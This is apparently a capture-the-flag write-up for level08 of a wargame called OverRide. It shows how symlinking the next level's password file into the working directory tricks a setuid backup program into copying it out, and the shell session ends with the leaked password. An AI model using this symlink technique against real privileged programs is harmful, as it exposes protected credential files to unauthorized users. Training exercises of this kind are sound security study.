## Program analysis

The program is basically a backup generator : it takes a file as argument, creates a copy of the file in the `backups/` folder, copies the content of the original file in the newly created backup file, and writes some logs at start and end of backup processing.

## Exploit

We could give teh `/home/users/level09/.pass` as argument to the program. But the problem is that we cannot provide a file which is not in the current folder. Indeed, the intermediate folder can't be created in the `/backups/` folder. Hence the program exit with an error message : 

```
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass

level08@OverRide:~$ ./level08 test_folder/test
ERROR: Failed to open ./backups/test_folder/test
```

So the trick is to create a symbolic link in the current folder, which points to our `/home/users/level09/.pass` file. There won't be any error related to accessing the file in /backups/, and the content of `/home/users/level09/.pass` will be written in the correponding `/backups/` file :

```
level08@OverRide:~$ ln -s /home/users/level09/.pass toto
level08@OverRide:~$ ls -la
total 32
drwxrwxrwx+ 1 level08 level08   160 Oct 19 14:31 .
dr-x--x--x  1 root    root      260 Oct  2  2016 ..
-r--------  1 level08 level08     0 Oct 19  2016 .bash_history
-rw-r--r--  1 level08 level08   220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root        7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level08 level08  3533 Sep 10  2016 .bashrc
-rw-r-xr--+ 1 level08 level08    41 Oct 19  2016 .pass
-rw-r--r--  1 level08 level08   675 Sep 10  2016 .profile
-r--------  1 level08 level08  2235 Oct 19  2016 .viminfo
drwxrwx---+ 1 level09 users     100 Oct 19 14:21 backups
-rwsr-s---+ 1 level09 users   12975 Oct 19  2016 level08
lrwxrwxrwx  1 level08 level08    25 Oct 19 14:31 toto -> /home/users/level09/.pass
level08@OverRide:~$ cat toto
cat: toto: Permission denied
level08@OverRide:~$ ./level08 toto
level08@OverRide:~$ cat backups/.log
LOG: Starting back up: toto
LOG: Finished back up toto
level08@OverRide:~$ cat backups/toto
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
level08@OverRide:~$
```
